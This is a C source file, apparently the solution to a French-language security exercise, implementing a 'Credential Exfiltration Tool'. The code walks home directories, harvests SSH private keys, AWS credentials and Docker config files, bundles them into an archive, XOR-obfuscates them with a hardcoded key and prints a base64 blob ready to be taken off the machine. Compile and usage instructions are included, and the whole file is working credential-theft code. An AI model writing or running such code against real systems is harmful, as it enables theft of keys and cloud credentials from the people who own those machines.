/*
 * =============================================================================
 * SOLUTION - File Exfiltration Tool
 * =============================================================================
 *
 * Exfiltrateur de credentials complet avec archivage, chiffrement et base64
 *
 * Compilation :
 *   gcc solution.c -o exfil
 *
 * Usage :
 *   ./exfil /home
 *
 * =============================================================================
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>

#define MAX_PATH 256
#define MAX_FILE_SIZE (1024 * 1024)  // 1MB
#define XOR_KEY "MySecretKey2024"

// Structure pour fichier
typedef struct {
    char path[MAX_PATH];
    unsigned char *content;
    size_t size;
} FileEntry;

// Liste globale
FileEntry *files = NULL;
int file_count = 0;

// Table base64
static const char base64_chars[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/*
 * Encoder en base64
 */
char* base64_encode(const unsigned char *data, size_t input_length) {
    size_t output_length = 4 * ((input_length + 2) / 3);
    char *encoded = malloc(output_length + 1);
    if (!encoded) return NULL;

    for (size_t i = 0, j = 0; i < input_length;) {
        uint32_t octet_a = i < input_length ? data[i++] : 0;
        uint32_t octet_b = i < input_length ? data[i++] : 0;
        uint32_t octet_c = i < input_length ? data[i++] : 0;
        uint32_t triple = (octet_a << 16) + (octet_b << 8) + octet_c;

        encoded[j++] = base64_chars[(triple >> 18) & 0x3F];
        encoded[j++] = base64_chars[(triple >> 12) & 0x3F];
        encoded[j++] = base64_chars[(triple >> 6) & 0x3F];
        encoded[j++] = base64_chars[triple & 0x3F];
    }

    // Padding
    for (int i = 0; i < (3 - input_length % 3) % 3; i++)
        encoded[output_length - 1 - i] = '=';

    encoded[output_length] = '\0';
    return encoded;
}

/*
 * Chiffrement XOR
 */
void xor_encrypt(unsigned char *data, size_t size) {
    size_t key_len = strlen(XOR_KEY);
    for (size_t i = 0; i < size; i++) {
        data[i] ^= XOR_KEY[i % key_len];
    }
}

/*
 * Lire un fichier
 */
int read_file_content(const char *path, unsigned char **content, size_t *size) {
    struct stat st;
    if (stat(path, &st) != 0) {
        return -1;
    }

    if (st.st_size > MAX_FILE_SIZE) {
        fprintf(stderr, "[-] File too large: %s\n", path);
        return -1;
    }

    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        return -1;
    }

    *content = malloc(st.st_size);
    if (!*content) {
        close(fd);
        return -1;
    }

    ssize_t bytes_read = read(fd, *content, st.st_size);
    close(fd);

    if (bytes_read != st.st_size) {
        free(*content);
        return -1;
    }

    *size = st.st_size;
    return 0;
}

/*
 * Ajouter un fichier a la liste
 */
void add_file(const char *path) {
    unsigned char *content;
    size_t size;

    if (read_file_content(path, &content, &size) != 0) {
        return;
    }

    files = realloc(files, (file_count + 1) * sizeof(FileEntry));
    strncpy(files[file_count].path, path, MAX_PATH - 1);
    files[file_count].content = content;
    files[file_count].size = size;
    file_count++;

    printf("[+] Added: %s (%zu bytes)\n", path, size);
}

/*
 * Scanner recursif
 */
void scan_directory(const char *path, int depth) {
    if (depth > 5) return;

    DIR *dir = opendir(path);
    if (!dir) return;

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 ||
            strcmp(entry->d_name, "..") == 0) {
            continue;
        }

        char fullpath[MAX_PATH];
        snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);

        struct stat st;
        if (lstat(fullpath, &st) != 0) continue;

        if (S_ISDIR(st.st_mode)) {
            if (strcmp(entry->d_name, ".ssh") == 0 ||
                strcmp(entry->d_name, ".aws") == 0 ||
                strcmp(entry->d_name, ".docker") == 0) {
                scan_directory(fullpath, depth + 1);
            }
        }
        else if (S_ISREG(st.st_mode)) {
            // Chercher fichiers sensibles
            if (strstr(entry->d_name, "id_rsa") ||
                strstr(entry->d_name, "id_dsa") ||
                strstr(entry->d_name, "id_ecdsa") ||
                strcmp(entry->d_name, "credentials") == 0 ||
                strcmp(entry->d_name, "config.json") == 0) {
                add_file(fullpath);
            }
        }
    }

    closedir(dir);
}

/*
 * Creer archive
 */
unsigned char* create_archive(size_t *total_size) {
    // Calculer taille totale
    *total_size = 0;
    for (int i = 0; i < file_count; i++) {
        *total_size += sizeof(uint32_t);  // path length
        *total_size += strlen(files[i].path) + 1;
        *total_size += sizeof(uint32_t);  // content size
        *total_size += files[i].size;
    }

    unsigned char *archive = malloc(*total_size);
    if (!archive) return NULL;

    unsigned char *ptr = archive;

    for (int i = 0; i < file_count; i++) {
        // Ecrire longueur path
        uint32_t path_len = strlen(files[i].path) + 1;
        memcpy(ptr, &path_len, sizeof(uint32_t));
        ptr += sizeof(uint32_t);

        // Ecrire path
        memcpy(ptr, files[i].path, path_len);
        ptr += path_len;

        // Ecrire taille contenu
        uint32_t content_size = files[i].size;
        memcpy(ptr, &content_size, sizeof(uint32_t));
        ptr += sizeof(uint32_t);

        // Ecrire contenu
        memcpy(ptr, files[i].content, files[i].size);
        ptr += files[i].size;
    }

    return archive;
}

int main(int argc, char *argv[]) {
    printf("[*] Credential Exfiltration Tool\n");
    printf("[*] ========================================\n\n");

    const char *start_path = (argc > 1) ? argv[1] : "/home";

    printf("[*] Scanning from: %s\n\n", start_path);
    scan_directory(start_path, 0);

    if (file_count == 0) {
        printf("[-] No sensitive files found\n");
        return 0;
    }

    printf("\n[*] Creating archive...\n");
    size_t archive_size;
    unsigned char *archive = create_archive(&archive_size);
    if (!archive) {
        fprintf(stderr, "[-] Failed to create archive\n");
        return 1;
    }

    printf("[*] Encrypting with XOR...\n");
    xor_encrypt(archive, archive_size);

    printf("[*] Encoding to base64...\n");
    char *encoded = base64_encode(archive, archive_size);
    if (!encoded) {
        fprintf(stderr, "[-] Failed to encode\n");
        free(archive);
        return 1;
    }

    printf("\n[+] Exfiltration blob:\n");
    printf("%s\n", encoded);

    // Cleanup
    free(encoded);
    free(archive);
    for (int i = 0; i < file_count; i++) {
        free(files[i].content);
    }
    free(files);

    printf("\n[+] Done. Found %d files.\n", file_count);

    return 0;
}
